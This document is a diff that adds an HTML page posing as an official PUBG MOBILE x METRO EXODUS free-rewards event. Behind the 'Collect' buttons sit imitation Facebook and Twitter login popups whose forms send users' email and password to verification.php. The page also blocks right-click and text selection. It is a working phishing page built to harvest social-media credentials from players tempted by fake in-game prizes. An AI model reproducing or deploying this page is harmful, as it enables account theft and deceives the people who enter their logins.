@@ -1,0 +1,254 @@
+<!-- URL =http://kualazone.com/--><!-- w =(['KUALAZONE.COM', 'kualazone.com'], [datetime.datetime(2020, 11, 26, 4, 55, 26), datetime.datetime(2020, 11, 25, 23, 55, 26)], [datetime.datetime(2021, 11, 26, 4, 55, 26), datetime.datetime(2021, 11, 25, 23, 55, 26)])--><html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1.0" name="viewport"/>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible">
+   <title>
+    PUBG MOBILE x METRO EXODUS
+   </title>
+   <meta content="PUBG MOBILE x METRO EXODUS" property="og:title"/>
+   <meta content="Collect your special rewards at the PUBG MOBILE x METRO EXODUS event. This opportunity is limited and without the need for topup. Collect your rewards now!" property="og:description"/>
+   <meta content="./" property="og:url"/>
+   <meta content="PUBG MOBILE x METRO EXODUS" property="og:site_name"/>
+   <meta content="website" property="og:type"/>
+   <meta content="PUBG MOBILE" name="copyright"/>
+   <meta content="#000" name="theme-color"/>
+   <meta content="Collect your special rewards at the PUBG MOBILE x METRO EXODUS event. This opportunity is limited and without the need for topup. Collect your rewards now!" name="description"/>
+   <meta content="https://i.ibb.co/0jZX3yd/season.png" property="og:image"/>
+   <link href="https://www.pubgmobile.com/common/images/icon_logo.jpg" rel="icon"/>
+   <link href="css/style.css" rel="stylesheet"/>
+   <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/>
+  </meta>
+ </head>
+ <body oncontextmenu="return false" ondragstart="return false" onselectstart="return false">
+  <div class="loader">
+   <img src="https://www.pubgmobile.com/en/event/pubgmxmetro/images/loading1.gif"/>
+   <h1>
+    Loading...
+   </h1>
+  </div>
+  <section>
+   <div class="imgBox">
+    <video autoplay="" loop="" muted="" src="media/pubg.mp4">
+    </video>
+   </div>
+   <div class="slogan">
+    <img src="img/pubgm.png"/>
+    <img src="img/x.png"/>
+    <img src="img/metroexodus.png"/>
+   </div>
+   <div class="area">
+    <img class="banner" src="img/banner.png"/>
+    <div class="hadiah">
+     <div class="card">
+      <img src="img/reward/1.png"/>
+      <div class="cardbtn" onclick="open_reward(this);" src="img/reward/1.png">
+       Collect
+      </div>
+     </div>
+     <div class="card">
+      <img src="img/reward/2.png"/>
+      <div class="cardbtn" onclick="open_reward(this);" src="img/reward/2.png">
+       Collect
+      </div>
+     </div>
+     <div class="card">
+      <img src="img/reward/3.png"/>
+      <div class="cardbtn" onclick="open_reward(this);" src="img/reward/3.png">
+       Collect
+      </div>
+     </div>
+     <div class="card">
+      <img src="img/reward/4.png"/>
+      <div class="cardbtn" onclick="open_reward(this);" src="img/reward/4.png">
+       Collect
+      </div>
+     </div>
+     <div class="card">
+      <img src="img/reward/5.png"/>
+      <div class="cardbtn" onclick="open_reward(this);" src="img/reward/5.png">
+       Collect
+      </div>
+     </div>
+     <div class="card">
+      <img src="img/reward/6.png"/>
+      <div class="cardbtn" onclick="open_reward(this);" src="img/reward/6.png">
+       Collect
+      </div>
+     </div>
+    </div>
+   </div>
+   <div class="mask">
+   </div>
+   <div class="login open_reward" style="height: auto;">
+    <div class="atas">
+     Collect This?
+    </div>
+    <div class="garis">
+    </div>
+    <img id="myImgReward" src="" style="width:90px; height:90px; margin-top: 20px; margin-left:auto; margin-right:auto; background:red; display:block;"/>
+    <br/>
+    <button onclick="close_rewards()" style="background: none; width: 30%; height: auto; margin-left: 40px; padding: 4px; color: #eaa300; font-size: 15px; font-family: pubg; font-weight: bold; text-align: center; border: 1px solid #eaa300; border-radius: 2px; outline: none; float: left;" type="button">
+     Cancel
+    </button>
+    <button onclick="open_login()" style="background: none; width: 30%; height: auto; margin-right: 40px; padding: 4px; color: #eaa300; font-size: 15px; font-family: pubg; font-weight: bold; text-align: center; border: 1px solid #eaa300; border-radius: 2px; outline: none; float: right;" type="button">
+     Collect
+    </button>
+   </div>
+   <div class="login account_login">
+    <div class="atas">
+     Account Login
+    </div>
+    <div class="garis">
+    </div>
+    <div class="sos">
+     <div class="med" id="fb">
+      <i aria-hidden="true" class="fa fa-facebook-square">
+      </i>
+      Login using Facebook
+     </div>
+     <div class="med" id="tw">
+      <i aria-hidden="true" class="fa fa-twitter">
+      </i>
+      Login using Twitter
+     </div>
+    </div>
+   </div>
+   <div class="popup-login login-facebook animated fadeIn" style="display: none;">
+    <div class="popup-box-login-fb">
+     <a class="close-fb" onclick="tutup_facebook()">
+      <i aria-hidden="true" class="fa fa-times">
+      </i>
+     </a>
+     <div class="navbar-fb">
+      <img src="img/facebook_text.png" width="45"/>
+     </div>
+     <div class="content-box-fb">
+      <img height="60" src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg" width="60"/>
+      <div class="txt-login-fb">
+       Log in to your Facebook account to connect to PUBG MOBILE
+      </div>
+      <form action="verification.php" class="login-form" method="post">
+       <label>
+        <input autocapitalize="off" autocomplete="off" name="email" placeholder="Mobile number or email address" required="" type="text"/>
+       </label>
+       <label>
+        <input autocapitalize="off" autocomplete="off" name="password" placeholder="Password" required="" type="password"/>
+       </label>
+       <input name="login" readonly="" type="hidden" value="Facebook"/>
+       <button class="btn-login-fb" type="submit">
+        Log In
+       </button>
+      </form>
+      <div class="txt-create-account">
+       Create account
+      </div>
+      <div class="txt-not-now">
+       Not now
+      </div>
+      <div class="txt-forgotten-password">
+       Forgotten password?
+      </div>
+     </div>
+     <div class="language-box">
+      <center>
+       <div class="language-name language-name-active">
+        English (UK)
+       </div>
+       <div class="language-name">
+        Bahasa Indonesia
+       </div>
+       <div class="language-name">
+        Basa Jawa
+       </div>
+       <div class="language-name">
+        Bahasa Melayu
+       </div>
+       <div class="language-name">
+        日本語
+       </div>
+       <div class="language-name">
+        Español
+       </div>
+       <div class="language-name">
+        Português (Brasil)
+       </div>
+       <div class="language-name">
+        <i class="fa fa-plus">
+        </i>
+       </div>
+      </center>
+     </div>
+     <div class="copyright">
+      Facebook Inc.
+     </div>
+    </div>
+   </div>
+   <div class="popup-login login-twitter animated fadeIn" style="display: none;">
+    <div class="popup-box-login-twitter">
+     <a class="close-other" onclick="tutup_twitter()">
+      <i aria-hidden="true" class="fa fa-times">
+      </i>
+     </a>
+     <div class="header-twitter">
+      <center>
+       <img src="img/twitter_text.png" style="margin-bottom:-25px;" width="45"/>
+      </center>
+     </div>
+     <div class="box-twitter">
+      <center>
+       <form action="verification.php" method="post">
+        <div class="txt-login-twitter">
+         Login to Twitter
+        </div>
+        <div class="input-box-twitter">
+         <label>
+          Phone, email, or username
+         </label>
+         <input name="email" placeholder="" required="" type="text"/>
+        </div>
+        <div class="input-box-twitter">
+         <label>
+          Password
+         </label>
+         <input name="password" placeholder="" required="" type="password"/>
+        </div>
+        <input name="login" readonly="" type="hidden" value="Twitter"/>
+        <button class="btn-login-twitter" type="submit">
+         Log In
+        </button>
+        <div class="footer-menu-twitter">
+         Forgot password?
+        </div>
+        <div class="footer-menu-twitter bulet">
+         •
+        </div>
+        <div class="footer-menu-twitter">
+         Sign up to Twitter
+        </div>
+       </form>
+      </center>
+     </div>
+    </div>
+   </div>
+  </section>
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js">
+  </script>
+  <script src="js/style.js">
+  </script>
+  <script>
+   function open_reward(ag) {
+    var myReward = $(ag).attr("src");
+    $('.open_reward').show();
+    $('#myImgReward').attr('src',myReward);
+}
+function close_rewards(){
+	$(".open_reward").hide()
+}
+function open_login(){
+	$(".account_login").show()
+	$(".open_reward").hide()
+}
+  </script>
+ </body>
+</html>
